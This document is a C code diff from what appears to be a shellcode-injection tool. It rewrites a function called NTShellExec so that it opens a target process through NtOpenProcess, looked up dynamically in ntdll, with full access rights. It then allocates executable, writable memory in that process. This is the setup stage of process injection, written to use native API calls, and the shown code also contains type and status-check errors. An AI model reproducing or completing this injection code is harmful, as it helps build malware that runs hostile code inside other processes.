@@ -24,19 +24,33 @@ int main(int argc, char* argv[]){
 
 int NTShellExec(DWORD process_id){
 
-    //open handle to given process
-    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, process_id);
+    //NtOpenProcess
+    PHANDLE hProcess = NULL;
 
-    if(hProcess == NULL){
-        printf("error while attempting to get handle to process with PID : %ld -> error : %zd \n", process_id, GetLastError());
-        return EXIT_FAILURE;
-    };
+    OBJECT_ATTRIBUTES OA           = { sizeof(OA), NULL };
+    CLIENT_ID         CID          = { (HANDLE)process_id, NULL };
+
+    LPNTOPENPROCESS ptrOpenProcess = (LPNTOPENPROCESS)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtOpenProcess");
+
+    if(ptrOpenProcess == NULL){
+        printf("unable to get ptr to NtOpenProcess with error : %zd\n", GetLastError());
+        goto CLEANUP;
+    }
+
+    NTSTATUS OpenProcess_status = ptrOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
+
+    if(OpenProcess_status == NULL){
+        printf("unable to get handle to process...\n");
+        goto CLEANUP;
+    }
+
 
     //ptr to AllocateVirtualMemory
     LPNTALLOCATEVIRTUALMEMORY ptrAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
 
     if(ptrAllocateVirtualMemory == NULL){
-        printf("unable to get ptr to NtAllocateVirtualMemory with error : %zd", GetLastError());
+        printf("unable to get ptr to NtAllocateVirtualMemory with error : %zd\n", GetLastError());
+        goto CLEANUP;
     }
 
     //params
@@ -47,8 +61,8 @@ int NTShellExec(DWORD process_id){
     NTSTATUS AVMstatus = ptrAllocateVirtualMemory(hProcess, &rBuffer, NULL, &sizeShellCode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
     if(AVMstatus != STATUS_SUCCESS){
-        printf("unable to alloc memory...");
-        return EXIT_FAILURE;
+        printf("unable to alloc memory...\n");
+        goto CLEANUP;
     }
 
 
